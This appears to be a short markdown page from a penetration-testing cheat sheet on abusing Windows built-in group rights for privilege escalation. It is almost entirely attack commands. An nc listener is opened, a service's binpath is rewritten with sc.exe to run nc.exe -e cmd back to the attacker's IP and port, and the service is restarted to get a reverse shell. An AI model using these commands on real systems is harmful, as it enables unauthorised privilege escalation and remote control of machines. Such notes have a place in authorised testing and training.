---
title: "Built-in Group"
date: 2024-7-24
tags: ["built-in group", "active driectory", "ad", "Windows", "privesc"]
---

#### Abuse #1. Modify service path

```console
# Start a nc listener
rlwrap nc -lvnp <LOCAL_PORT>
```

{{< tab set1 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Change service path

```console
# Assumed nc.exe is uploaded
sc.exe config <SERVICE> binpath="C:\ProgramData\nc.exe -e cmd <LOCAL_IP> <LOCAL_PORT>"
```

#### 2. Restart service

```console
# Stop service
sc.exe stop <SERVICE>
```

```console
# Start service
sc.exe start <SERVICE>
```

{{< /tabcontent >}}
